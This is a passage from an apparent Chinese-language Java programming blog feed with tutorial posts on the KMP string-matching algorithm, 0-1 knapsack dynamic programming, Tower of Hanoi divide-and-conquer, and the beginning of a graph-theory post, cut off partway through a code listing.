data-lazy-src="https://unpkg.com/nan-picture/blog/20200821235030.png"></p><h2 id="next数组"><a href="#next数组" class="headerlink" title="next数组"></a>next数组</h2><p>next数组是把《部分匹配表》的<strong>部分匹配值往右右移一格，然后第一个位置补为 -1</strong>。</p><p>相应地，<strong>next的值就是返回失配位之前（不包括失配位）的最长公共前后缀。这是重点！！！</strong></p><hr><table><thead><tr><th>搜索词</th><th>A</th><th>B</th><th>C</th><th>D</th><th>A</th><th>B</th><th>D</th></tr></thead><tbody><tr><td>next</td><td>-1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>2</td></tr></tbody></table><p><strong>用代码求next数组的实现思路：</strong></p><ol><li><p>next[ 0 ] &#x3D; -1; </p></li><li><p>前一个字符的next值是0时，只需将当前字符的前一个字符与子串第一个字符比较，若相等，说明当前字符的next值就是1了。</p></li><li><p>前一个字符的next值是1时，只需将当前字符的前一个字符与子串第二个字符进行比较，如果当前字符的前一个字符又与子串第二个字符相等了，说明当前字符的next值就是2了。</p></li><li><p>按照上面的推理，如果一直相等，next值就一直累加：</p><p><strong>k &#x3D; next [ j ]，p[k] &#x3D;&#x3D; p[j]，则next[ j + 1 ] &#x3D; next [ j ] + 1；</strong></p></li><li><p>若p[k] ≠ p[j]，如果此时p[ next[k] ] &#x3D;&#x3D; p[j]，则next[ j + 1 ] &#x3D;  next[ k ] + 1，否则继续递归前缀索引 **k &#x3D; next[k]**，而后重复此过程。</p></li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215003.png"></p><h2 id="KMP算法的代码实现"><a href="#KMP算法的代码实现" class="headerlink" title="KMP算法的代码实现"></a>KMP算法的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.kmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KmpAlgorithm</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;BBC ABCDAB ABCDABCDABDE&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">pattern</span> <span class="operator">=</span> <span class="string">&quot;ABCDABD&quot;</span>;</span><br><span class="line"><span class="type">int</span>[] next = getNext(pattern);</span><br><span class="line">System.out.println(Arrays.toString(next));</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> search(text, pattern, next);</span><br><span class="line">System.out.println(<span class="string">&quot;index=&quot;</span> + index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] getNext(String pattern) &#123;</span><br><span class="line"><span class="type">int</span>[] next = <span class="keyword">new</span> <span class="title class_">int</span>[pattern.length()];</span><br><span class="line">next[<span class="number">0</span>] = -<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (j &lt; pattern.length() - <span class="number">1</span>) &#123;<span class="comment">//这里要注意减一</span></span><br><span class="line"><span class="keyword">if</span> (k == -<span class="number">1</span> || pattern.charAt(k) == pattern.charAt(j)) &#123;</span><br><span class="line">k++;</span><br><span class="line">j++;</span><br><span class="line">next[j] = k;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">k = next[k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(String text, String pattern, <span class="type">int</span>[] next)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>; i &lt; text.length(); i++) &#123;</span><br><span class="line"><span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; text.charAt(i) != pattern.charAt(j)) &#123;</span><br><span class="line">j = next[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (text.charAt(i) == pattern.charAt(j)) &#123;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j == pattern.length()) &#123;</span><br><span class="line"><span class="keyword">return</span> i - j + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>[-1, 0, 0, 0, 0, 1, 2]</p><p>index&#x3D;15</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP算法 </tag>
            
            <tag> 朴素匹配算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划</title>
      <link href="/posts/d706/"/>
      <url>/posts/d706/</url>
      
        <content type="html"><![CDATA[<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><p><a href="https://www.bilibili.com/video/BV18x411V7fm">b站上一个up主关于动态规划的教学，有助于理解动态规划的主要思想</a></p><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ol><li>动态规划(Dynamic Programming)算法的核心思想是：将大问题划分为小问题进行解决，从而一步步获取最优解的处理算法</li><li>动态规划算法与分治算法类似，其基本思想也是将待求解问题分解成若干个子问题，先求解子问题，然后从这些子问题的解得到原问题的解</li><li>与分治法不同的是，适合于用动态规划求解的问题，经分解得到<strong>子问题往往不是互相独立</strong>的。 ( 即下一个子阶段的求解是建立在上一个子阶段的解的基础上，进行进一步的求解 )</li><li>动态规划可以通过<strong>填表</strong>的方式来逐步推进，得到最优解</li></ol><h2 id="动态规划算法最佳实践-背包问题"><a href="#动态规划算法最佳实践-背包问题" class="headerlink" title="动态规划算法最佳实践-背包问题"></a>动态规划算法最佳实践-背包问题</h2><p>背包问题：有一个背包，容量为4磅 ， 现有如下物品：</p><table><thead><tr><th>物品</th><th>重量</th><th>价格</th></tr></thead><tbody><tr><td>吉他(G)</td><td>1</td><td>1500</td></tr><tr><td>音响(S)</td><td>4</td><td>3000</td></tr><tr><td>电脑(L)</td><td>3</td><td>2000</td></tr></tbody></table><p><strong>要求：</strong></p><p>目标为装入的背包的总价值最大，并且重量不超出<br>装入的物品不能重复</p><h2 id="背包问题思路分析"><a href="#背包问题思路分析" class="headerlink" title="背包问题思路分析"></a>背包问题思路分析</h2><blockquote><p>背包问题主要是指一个给定容量的背包、若干具有一定价值和重量的物品，如何选择物品放入背包使物品的价值最大。其中又分01背包和完全背包(完全背包指的是：每种物品都有无限件可用)<br>这里的问题属于01背包，即每个物品最多放一个。而无限背包可以转化为01背包。</p></blockquote><p>解决类似的问题可以分解成一个个的小问题进行解决，假设存在背包容量大小分为1，2，3，4的各种容量的背包(分配容量的规则为最小重量的整数倍)：</p><p>例如:</p><table><thead><tr><th>物品</th><th>0 磅</th><th>1磅</th><th>2磅</th><th>3磅</th><th>4磅</th></tr></thead><tbody><tr><td></td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>吉他(G)</td><td>0</td><td></td><td></td><td></td><td></td></tr><tr><td>音响(S)</td><td>0</td><td></td><td></td><td></td><td></td></tr><tr><td>电脑(L)</td><td>0</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>对于第一行(i&#x3D;1), 目前只有吉他可以选择，所以</p><table><thead><tr><th>物品</th><th>0 磅</th><th>1磅</th><th>2磅</th><th>3磅</th><th>4磅</th></tr></thead><tbody><tr><td></td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>吉他(G)</td><td>0</td><td>1500(G)</td><td>1500(G)</td><td>1500(G)</td><td>1500(G)</td></tr><tr><td>音响(S)</td><td>0</td><td></td><td></td><td></td><td></td></tr><tr><td>电脑(L)</td><td>0</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>对于第二行(i&#x3D;2),目前存在吉他和音响可以选择,所以</p><table><thead><tr><th>物品</th><th>0 磅</th><th>1磅</th><th>2磅</th><th>3磅</th><th>4磅</th></tr></thead><tbody><tr><td></td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>吉他(G)</td><td>0</td><td>1500(G)</td><td>1500(G)</td><td>1500(G)</td><td>1500(G)</td></tr><tr><td>音响(S)</td><td>0</td><td>1500(G)</td><td>1500(G)</td><td>1500(G)</td><td>3000(S)</td></tr><tr><td>电脑(L)</td><td>0</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>对于第三行(i&#x3D;3),目前存在吉他和音响、电脑可以选择,所以</p><table><thead><tr><th>物品</th><th>0 磅</th><th>1磅</th><th>2磅</th><th>3磅</th><th>4磅</th></tr></thead><tbody><tr><td></td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>吉他(G)</td><td>0</td><td>1500(G)</td><td>1500(G)</td><td>1500(G)</td><td>1500(G)</td></tr><tr><td>音响(S)</td><td>0</td><td>1500(G)</td><td>1500(G)</td><td>1500(G)</td><td>3000(S)</td></tr><tr><td>电脑(L)</td><td>0</td><td>1500(G)</td><td>1500(G)</td><td>2000(L)</td><td>3500(L+G)</td></tr></tbody></table><hr><p><strong>对上面填表过程进行分析：</strong></p><ol><li><p>对第一行和第一列填表，都是0</p></li><li><p>当要放入的商品重量大于当前列表示的重量时，table[ i ] [ j ] &#x3D; table[ i-1 ] [ j ]</p></li></ol><p>   例如：存在吉他和音响可以选择时，由于音响是4磅，所以1、2、3磅这几列放不了音响，所以直接使用上一个单元格的装入策略。</p><ol start="3"><li><p>当要放入的商品重量小于或等于当前列表示的重量时</p><ul><li>不放入该商品，table[ i ] [ j ] &#x3D; table[ i-1 ] [ j ]</li><li>放入该商品，table[ i ] [ j ] &#x3D; value[该商品价值] +  table[ i-1 ] [当前列表示的重量 - 该商品重量]</li><li>根据最大价值选择放入或不放入该商品</li></ul></li></ol><h2 id="背包问题的代码实现"><a href="#背包问题的代码实现" class="headerlink" title="背包问题的代码实现"></a>背包问题的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.dynanic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KnapsackProblem</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] weight = &#123; <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span> &#125;;<span class="comment">// 每件物品的重量</span></span><br><span class="line"><span class="type">int</span>[] value = &#123; <span class="number">1500</span>, <span class="number">3000</span>, <span class="number">2000</span> &#125;;<span class="comment">// 每件物品的价格</span></span><br><span class="line"><span class="type">int</span> <span class="variable">maxWeight</span> <span class="operator">=</span> <span class="number">4</span>;<span class="comment">// 背包的最大容量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// table[i][j]表示在前i个物品中能够装入容量为j的背包中的最大价值</span></span><br><span class="line"><span class="type">int</span>[][] table = <span class="keyword">new</span> <span class="title class_">int</span>[weight.length + <span class="number">1</span>][maxWeight + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span>[] goods = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];<span class="comment">// 记录放入物品的情况</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态规划处理table这个二维数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; table.length; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; table[i].length; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (weight[i - <span class="number">1</span>] &gt; j) &#123;</span><br><span class="line">table[i][j] = table[i - <span class="number">1</span>][j];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">table[i][j] = Math.max(table[i - <span class="number">1</span>][j], value[i - <span class="number">1</span>] + table[i - <span class="number">1</span>][j - weight[i - <span class="number">1</span>]]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历table这个二维数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; table.length; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; table[i].length; j++) &#123;</span><br><span class="line">System.out.print(table[i][j] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> maxWeight;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> table.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;<span class="comment">// 从最后一格向前遍历</span></span><br><span class="line"><span class="keyword">if</span> (table[i][j] == table[i - <span class="number">1</span>][j]) &#123;<span class="comment">// 使用上一个单元格的装入策略，说明没有装入该物品</span></span><br><span class="line">goods[i - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">goods[i - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">j = j - weight[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出我们是放入了哪些商品</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; goods.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (goods[i] == <span class="number">1</span>) &#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;第%d个商品放入到背包\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>0 0 0 0 0<br>0 1500 1500 1500 1500<br>0 1500 1500 1500 3000<br>0 1500 1500 2000 3500<br>第1个商品放入到背包<br>第3个商品放入到背包</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态规划 </tag>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分治算法</title>
      <link href="/posts/b60f/"/>
      <url>/posts/b60f/</url>
      
        <content type="html"><![CDATA[<h1 id="分治算法-Divide-and-Conquer-P"><a href="#分治算法-Divide-and-Conquer-P" class="headerlink" title="分治算法(Divide-and-Conquer(P))"></a>分治算法(Divide-and-Conquer(P))</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ol><li>分治法是一种很重要的算法。字面上的解释是“分而治之”，就是把一个复杂的问题分成两个或更多的相同或相似的子问题，再把子问题分成更小的子问题……直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并。这个技巧是很多高效算法的基础，如排序算法(快速排序，归并排序)，傅立叶变换(快速傅立叶变换)……</li><li>分治算法可以求解的一些经典问题：<br>二分搜索<br>大整数乘法<br>棋盘覆盖<br>合并排序<br>快速排序<br>线性时间选择<br>最接近点对问题<br>循环赛日程表<br>汉诺塔</li></ol><h2 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h2><p>分治法在每一层递归上都有三个步骤：</p><blockquote><p>分解：将原问题分解为若干个规模较小，相互独立，与原问题形式相同的子问题<br>解决：若子问题规模较小而且容易被解决则直接解，否则递归地解各个子问题<br>合并：将各个子问题的解合并为原问题的解</p></blockquote><h2 id="算法设计模式"><a href="#算法设计模式" class="headerlink" title="算法设计模式"></a>算法设计模式</h2><blockquote><p>if |P|≤ n0<br>   then return(ADHOC(P))<br>&#x2F;&#x2F;将P分解为较小的子问题 P1 ,P2 ,…,Pk<br>for i←1 to k<br>do yi ← Divide-and-Conquer(Pi)   递归解决Pi<br>T ← MERGE(y1,y2,…,yk)   合并子问题<br>return(T)</p></blockquote><p>其中|P|表示问题P的规模；n0为一阈值，表示当问题P的规模不超过n0时，问题已容易直接解出，不必再继续分解。ADHOC(P)是该分治法中的基本子算法，用于直接解小规模的问题P。因此，当P的规模不超过n0时直接用算法ADHOC(P)求解。算法MERGE(y1,y2,…,yk)是该分治法中的合并子算法，用于将P的子问题P1 ,P2 ,…,Pk的相应的解y1,y2,…,yk合并为P的解。</p><h2 id="分治算法最佳实践-汉诺塔"><a href="#分治算法最佳实践-汉诺塔" class="headerlink" title="分治算法最佳实践-汉诺塔"></a>分治算法最佳实践-汉诺塔</h2><p>汉诺塔：汉诺塔（又称河内塔）问题是源于印度一个古老传说的益智玩具。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着64片黄金圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，<strong>在小圆盘上不能放大圆盘，在三根柱子之间一次只能移动一个圆盘。</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200817181950.png"></p><h2 id="汉诺塔游戏的思路分析"><a href="#汉诺塔游戏的思路分析" class="headerlink" title="汉诺塔游戏的思路分析"></a>汉诺塔游戏的思路分析</h2><ol><li>如果是只有一个盘， A-&gt;C</li><li>如果我们有 n &gt;&#x3D; 2 的情况时，我们总是可以看做是两个盘 ：① 最下边的盘  ②上面的所有盘<ul><li>先把最上面的所有盘 A-&gt;B</li><li>把最下边的盘 A-&gt;C</li><li>最后把B塔的所有盘 B-&gt;C</li></ul></li></ol><h2 id="汉诺塔的代码实现"><a href="#汉诺塔的代码实现" class="headerlink" title="汉诺塔的代码实现"></a>汉诺塔的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.dac;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hanoitower</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">hanoiTower(<span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hanoiTower</span><span class="params">(<span class="type">int</span> num, <span class="type">char</span> a, <span class="type">char</span> b, <span class="type">char</span> c)</span> &#123;</span><br><span class="line"><span class="comment">// 如果只有一个盘</span></span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">1</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;第1个盘从&quot;</span> + a + <span class="string">&quot;到&quot;</span> + c);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 如果我们有 n &gt;= 2 的情况时，我们总是可以看做是两个盘 ：1.最下边的盘 2.上面的所有盘</span></span><br><span class="line"><span class="comment">// 1. 先把最上面的所有盘 A-&gt;B， 移动过程会使用到 c</span></span><br><span class="line">hanoiTower(num - <span class="number">1</span>, a, c, b);</span><br><span class="line"><span class="comment">// 2. 把最下边的盘 A-&gt;C</span></span><br><span class="line">System.out.println(<span class="string">&quot;第&quot;</span> + num + <span class="string">&quot;个盘从&quot;</span> + a + <span class="string">&quot;到&quot;</span> + c);</span><br><span class="line"><span class="comment">// 3. 把B塔的所有盘从 B-&gt;C , 移动过程使用到 a塔</span></span><br><span class="line">hanoiTower(num - <span class="number">1</span>, b, a, c);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>第1个盘从A到C<br>第2个盘从A到B<br>第1个盘从C到B<br>第3个盘从A到C<br>第1个盘从B到A<br>第2个盘从B到C<br>第1个盘从A到C</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分治算法 </tag>
            
            <tag> 汉诺塔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图</title>
      <link href="/posts/b7fa/"/>
      <url>/posts/b7fa/</url>
      
        <content type="html"><![CDATA[<h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>图（Graph）是由顶点的<strong>有穷非空</strong>集合和顶点之间边的集合组成，通常表示为：G（V，E），其中，G表示一个图，V是图G中顶点的集合，E是图G中边的集合。</p><p>线性表中我们把数据元素叫元素，树中将数据元素叫结点，<strong>在图中的数据元素，我们则称之为顶点（Vertex）。</strong></p><p>图中，任意两个顶点之间都可能有关系，顶点之间的逻辑关系用边来表示，<strong>边集可以是空的</strong>。</p><hr><p>**无向边(Edge)**：若顶点V1到V2之间的边没有方向，则称这条边为无向边。（V1,V2）&#x3D;（V2,V1）。</p><p>**无向图(Undirected graphs)**：图中任意两个顶点之间的边都是无向边。</p><p><strong>有向边</strong>：若从顶点V1到V2的边有方向，则称这条边为有向边，也称**弧(Arc)**。用&lt;V1,V2&gt;表示，V1为弧尾(Tail)，V2为弧头(Head)。&lt;V1，V2&gt; ≠ &lt;V2，V1&gt;。</p><p>**有向图(Directed graphs)**：图中任意两个顶点之间的边都是有向边。</p><p><code>注意：无向边用“（）”，而有向边用“&lt; &gt;”表示。</code></p><p><strong>权（Weight）</strong>：与图的边或弧相关的数。</p><p><strong>网（Network）</strong>：带权的图。如下图，此图的权就是两地的距离。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200829151206.png"></p><p>在图中，若不存在顶点到其自身的边，且同一条边不重复出现，则称这样的图为<strong>简单图</strong>。下面两个就不是简单图。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200829150555.png"></p><p>在无向图中，如果任意两个顶点之间都存在边，则称该图为<strong>无向完全图</strong>。含有n个顶点的无向完全图有<strong>n×(n-1)&#x2F;2条边</strong>。</p><p>在有向图中，如果任意两个顶点之间都存在方向互为相反的两条弧，则称该图为<strong>有向完全图</strong>。含有n个顶点的有向完全图有**n×(n-1)**条边。</p><hr><p>顶点v的<strong>度</strong>：与v相关联的边的数目；</p><p>顶点v的<strong>出度</strong>：以v为<strong>起点</strong>有向边数；</p><p>顶点v的<strong>入度</strong>：以v为<strong>终点</strong>有向边数。</p><hr><p>在无向图G中，如果从顶点v到顶点v’有路径，则称v和v’是连通的。如果对于图中任意两个顶点Vi、Vj∈E，Vi和Vj都是连通的，则称G是<strong>连通图</strong>（Connected Graph）。无向图中的极大连通子图称为<strong>连通分量</strong>。</p><p>在有向图G中，如果对于每一对Vi、Vj∈V、Vi≠Vj，从Vi到Vj和从Vj到Vi都存在路径，则称G是<strong>强连通图</strong>。有向图中的极大强连通子图称做有向图的<strong>强连通分量</strong>。</p><p><strong>路径的长度</strong>是路径上的边或弧的数目。</p><p>第一个顶点到最后一个顶点相同的路径称为<strong>回路或环</strong>（Cycle）。除了第一个顶点和最后一个顶点之外，其余顶点不重复出现的回路，称为<strong>简单回路或简单环</strong>。两个图的粗线都构成环，左侧的环因第一个顶点和最后一个顶点都是B，且C、D、A没有重复出现，因此是一个简单环。而右侧的环，由于顶点C的重复，它就不是简单环了。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200829152602.png"></p><h2 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h2><p>图的邻接矩阵（Adjacency Matrix）存储方式是用两个数组来表示图。一个一维数组存储图中顶点信息，一个二维数组（称为邻接矩阵）存储图中的边或弧的信息。</p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200816172623.png" style="zoom: 67%;" /><p>​                                       <img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200829154636.png"  /><br>​                                  <img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200829154701.png"></p><h2 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h2><p>我们把这种数组与链表相结合的存储方法称为邻接表（Adjacency List）。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200816172207.png"></p><h2 id="边集数组"><a href="#边集数组" class="headerlink" title="边集数组"></a>边集数组</h2><p>边集数组是由两个一维数组构成。一个是存储顶点的信息；另一个是存储边的信息，这个边数组每个数据元素由一条边的起点下标（begin）、终点下标（end）和权（weight）组成。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200829155315.png"></p><h2 id="创建图的代码实现"><a href="#创建图的代码实现" class="headerlink" title="创建图的代码实现"></a>创建图的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 